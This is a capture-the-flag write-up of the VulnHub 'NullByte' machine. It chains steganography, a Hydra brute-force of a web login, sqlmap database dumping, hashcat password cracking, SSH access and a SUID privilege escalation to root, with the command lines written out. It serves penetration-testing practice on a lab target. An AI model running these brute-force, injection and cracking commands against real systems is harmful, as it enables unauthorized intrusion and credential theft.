# NullByte

**Platform:** VulnHub
**OS:** Linux
**Tags:** Steganography, SQL Injection, Hydra, Hash Cracking, SUID
**Date:** 2026-05-04

Steganography in an image reveals a hidden directory path; SQL injection and hash cracking give SSH access. A SUID binary gives root.

## 1. Enumeration

Identified the target on the network and ran a full port and service scan.

```bash
nmap -sC -sV -p- -T4 <TARGET_IP>
```

Findings:
- 80/tcp - HTTP, Apache web server
- 777/tcp - SSH running on non-standard port
- 3306/tcp - MySQL database

## 2. Steganography

Browsed the web server and found a simple page with an image. Closer inspection revealed a hidden message embedded inside the image using steganography.

```bash
exiftool main.gif
strings main.gif
```

**Hidden string found in image metadata, pointing to a URL path.**

## 3. Directory Enumeration and Login Brute-Force

Used the hint from the image to find a hidden endpoint. Set up Burp Suite to intercept traffic and identify the login form structure, then used Hydra to brute-force credentials.

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt -x php,html
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form "/path/login.php:user=^USER^&pass=^PASS^:invalid"
```

**Valid credentials found. Logged into the application.**

## 4. SQL Injection

After logging in, discovered a parameter in the application vulnerable to SQL injection. Extracted sensitive data including a hashed password.

```bash
sqlmap -u "http://<TARGET_IP>/path/page.php?param=1" --dbs
sqlmap -u "http://<TARGET_IP>/path/page.php?param=1" -D <dbname> --tables --dump
```

**Password hash extracted from database.**

Cracked the hash offline:

```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Hash cracked. Plaintext password recovered.**

## 5. SSH Access

Used the cracked credentials to authenticate via SSH on the non-standard port 777.

```bash
ssh -p 777 <user>@<TARGET_IP>
```

**Low-privileged user shell obtained.**

## 6. Privilege Escalation: SUID Binary

Searched for SUID binaries to find a privesc path.

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found a misconfigured SUID binary. Leveraged it to escalate to root.

**Root access obtained. Machine complete.**

Key Takeaway: This box chains multiple techniques: steg - web brute-force - SQLi - hash crack - SSH - SUID. Each stage feeds the next. Real engagements often look like this, a chain of small wins rather than one big exploit.
